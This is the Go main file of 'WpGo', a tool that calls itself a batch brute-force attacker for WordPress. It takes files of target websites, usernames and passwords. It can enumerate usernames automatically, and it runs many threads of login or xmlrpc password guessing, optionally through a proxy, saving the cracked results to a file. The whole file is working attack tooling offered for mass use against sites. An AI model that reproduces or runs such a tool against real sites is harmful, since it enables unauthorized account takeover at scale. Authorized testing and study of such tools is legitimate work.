package main

import (
	"flag"
	"fmt"
	"log"
	"os"
	"runtime/pprof"

	"github.com/code-scan/WpGo/module"
)

var hostFile, userFile, passFile, outFile string
var autoUser bool
var autoCount, threadCount int
var AttackType string

func banner() {
	fmt.Println(" _       __      ______    \n| |     / /___  / ____/___ \n| | /| / / __ \\/ / __/ __ \\\n| |/ |/ / /_/ / /_/ / /_/ /\n|__/|__/ .___/\\____/\\____/ \n      /_/                  ")
	fmt.Println("Batch Burte Force WordPress")
	fmt.Println("@Cond0r http://aq.mk\n\n")
}
func main() {
	banner()
	flag.StringVar(&hostFile, "w", "", "website list filepath")
	flag.StringVar(&userFile, "u", "", "username list filepath")
	flag.StringVar(&passFile, "p", "", "password list filepath")
	flag.IntVar(&autoCount, "c", 5, "max auto get user count")
	flag.IntVar(&threadCount, "t", 20, "max thread")
	flag.StringVar(&module.Proxy, "x", "", "proxy, socks5://user:pass@host:port, http://host:port")
	flag.StringVar(&outFile, "o", "result.txt", "out filepath")
	flag.StringVar(&AttackType, "a", "login", "attack type  login / xmprpc")
	flag.Parse()
	log.SetFlags(log.Lshortfile | log.LstdFlags)
	//hostFile = "dict/site.txt"
	//passFile = "dict/p.txt"
	//threadCount = 2000
	if hostFile == "" || passFile == "" {
		log.Println("website/password file is null")
		log.Println("usage:")
		log.Println(os.Args[0], " -h")
		return
	}
	var passlist []string
	var hostlist []string
	var userlist []string
	if userFile != "" {
		module.ReadListToArray(userFile, &userlist)
	}
	module.ReadListToArray(passFile, &passlist)
	module.ReadListToArray(hostFile, &hostlist)
	module.LogFile = outFile
	log.Println("[*] WebSite Path     : ", hostFile)
	log.Println("[*] WebSite Count    : ", len(hostlist))

	log.Println("[*] PassWord Path    : ", passFile)
	log.Println("[*] PassWord Count   : ", len(passlist))

	log.Println("[*] Max User Count   : ", autoCount)
	log.Println("[*] Max Thread Count : ", threadCount)

	log.Println("[*] Output Path      : ", outFile)

	//增加任务到队列
	module.SiteQueue = make(chan string, len(hostlist))
	module.TaskQueue = make(chan module.SiteTask, threadCount*30)

	defer pprof.StopCPUProfile()

	for _, site := range hostlist {
		module.SiteQueue <- site
	}
	for i := 0; i < threadCount; i++ {
		module.Wg.Add(2)
		go module.NewSend(passlist, userlist, autoCount)
		go module.NewWork(AttackType)
	}
	module.Wg.Wait()
}
